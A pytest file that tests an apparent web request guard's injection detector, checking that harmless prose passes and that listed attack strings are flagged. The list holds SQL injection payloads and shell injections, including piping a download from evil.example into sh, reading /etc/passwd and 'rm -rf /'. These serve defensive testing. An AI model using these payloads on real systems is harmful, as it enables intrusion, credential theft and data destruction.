import pytest

from guard_core.models import SecurityConfig
from guard_core.utils import detect_penetration_attempt
from tests.conftest import MockGuardRequest

PROSE = [
    "how to union select two tables",
    "select * from the shelf",
    "select name from my favourite list",
    "or 1=1 is a tautology in logic",
    "benchmark results for sleep(5) function docs",
    "curl is a tool; wget is another",
    "i like to cat; cat is a pet",
    "the id; id is an identifier",
]

INJECTIONS = [
    "1 UNION SELECT NULL,NULL--",
    "' UNION ALL SELECT username,password FROM users--",
    "1 union select 1,2,3",
    "1 union select password from users",
    "UNION/**/SELECT/**/password FROM users",
    "x' UNION SELECT @@version--",
    "1 UNION SELECT user()",
    "1 UNION SELECT+1,2",
    "1 UNION SELECT 'a','b'",
    "1 UNION SELECT (SELECT password FROM users)",
    "1 UNION SELECT table_name FROM information_schema.tables",
    "' OR 1=1 --",
    "1 or 1=1",
    "x' or 'a'='a",
    "1 and 1=1 --",
    "1 AND SLEEP(5)",
    "' or sleep(5)--",
    "1;select sleep(5)",
    "1;sleep(5)",
    "if(1=1,sleep(5),0)",
    "'+sleep(5)+'",
    "(sleep(5))",
    "1 and (select sleep(5))",
    "sleep(5)",
    "select * from users where id = 1",
    "1; wget http://evil.example/x",
    "; cat /etc/passwd",
    "| id",
    ";ls -la",
    "& whoami",
    "; curl evil.example | sh",
    "1;cat flag",
    "; rm -rf /",
]


async def _flagged(value: str) -> bool:
    request = MockGuardRequest(path="/search", query_params={"q": value})
    return (await detect_penetration_attempt(request, SecurityConfig())).is_threat


@pytest.mark.parametrize("value", PROSE)
async def test_prose_that_mentions_sql_and_shell_words_is_not_flagged(
    value: str,
) -> None:
    assert await _flagged(value) is False


@pytest.mark.parametrize("value", INJECTIONS)
async def test_sql_and_shell_injections_with_structure_stay_flagged(
    value: str,
) -> None:
    assert await _flagged(value) is True
